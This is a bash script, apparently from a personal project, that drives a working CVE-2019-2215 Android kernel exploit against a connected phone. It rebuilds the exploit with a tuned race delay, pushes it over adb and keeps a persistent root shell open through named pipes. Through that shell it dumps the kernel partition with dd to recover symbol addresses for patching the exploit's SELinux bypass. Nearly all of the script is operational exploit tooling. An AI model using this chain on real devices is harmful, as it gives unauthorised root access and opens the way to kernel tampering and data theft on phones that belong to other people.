#!/bin/bash
# Dump the kernel partition through the pristine root shell.
#
# Why: the exploit's SELinux bypass needs two static kernel addresses
# (AVC_CACHE and FAIR_SCHED_CLASS) that are compiled in for a different build of
# this kernel. Deriving them needs symbol addresses for THIS build, and the
# kernel image carries the kallsyms tables even though /proc/kallsyms masks the
# values. So: get the image, recover the symbols on the host, then binary-patch
# only those two constants in the pristine binary - which keeps the code layout
# (and therefore the race timing) exactly as it is now, when the race wins.
set -u
cd /home/placeless/dev/p20lite-cve
NDK=$(ls -d ~/Android/Sdk/ndk/*/ 2>/dev/null | head -1)
IN=/tmp/root.in
OUT=/tmp/root.out

echo "############ 1. rebuild the pristine exploit at DELAY=25 (the proven winner)"
git checkout -- exploit/cve_2019_2215.c exploit/include/kernel_specific.h
python3 - <<'PY'
import re
p='/home/placeless/dev/p20lite-cve/exploit/include/cve_2019_2215.h'
s=open(p).read()
open(p,'w').write(re.sub(r'#define DELAY \d+u', '#define DELAY 25u', s))
PY
"${NDK}ndk-build" -j4 NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk \
    APP_PLATFORM=android-28 APP_ABI=arm64-v8a 2>&1 | tail -1
timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215'

echo
echo "############ 2. persistent root shell"
rm -f "$IN" "$OUT"; mkfifo "$IN"; : > "$OUT"
adb shell /data/local/tmp/cve-2019-2215 < "$IN" >> "$OUT" 2>&1 &
EXPPID=$!
exec 9> "$IN"
for i in $(seq 1 120); do
  grep -aq "capabilities are overwritten" "$OUT" 2>/dev/null && { echo "  root after ${i}s"; break; }
  sleep 1
done
grep -aq "capabilities are overwritten" "$OUT" || { echo ">>> no root"; tail -5 "$OUT"; exit 1; }
sleep 3

runroot() {
  local MARK="MK$RANDOM$RANDOM" b
  b=$(wc -c < "$OUT")
  printf 'echo %s\n%s\necho %s\n' "$MARK" "$1" "$MARK" > "$IN"
  for i in $(seq 1 90); do
    sleep 1
    [ "$(tail -c +$((b+1)) "$OUT" | grep -ac "^$MARK$")" -ge 2 ] && break
  done
  tail -c +$((b+1)) "$OUT" | tr -d '\000' | awk -v m="$MARK" 'BEGIN{n=0}{if($0==m){n++;next} if(n==1)print}'
}

echo
echo "############ 3. can we read the kernel partition?"
runroot 'ls -la /dev/block/bootdevice/by-name/kernel; dd if=/dev/block/bootdevice/by-name/kernel of=/data/local/tmp/kernel.img bs=4096 2>&1 | tail -2; ls -la /data/local/tmp/kernel.img 2>&1'

echo
echo "############ 4. the partition list and sizes (for the record)"
runroot 'for p in kernel ramdisk recovery_ramdisk; do printf "%s " $p; wc -c < /dev/block/bootdevice/by-name/$p 2>/dev/null || echo "?"; done'

echo
echo "### session left open; kill this script to end"
while kill -0 "$EXPPID" 2>/dev/null; do sleep 5; done
echo "### exploit exited"
exec 9>&-
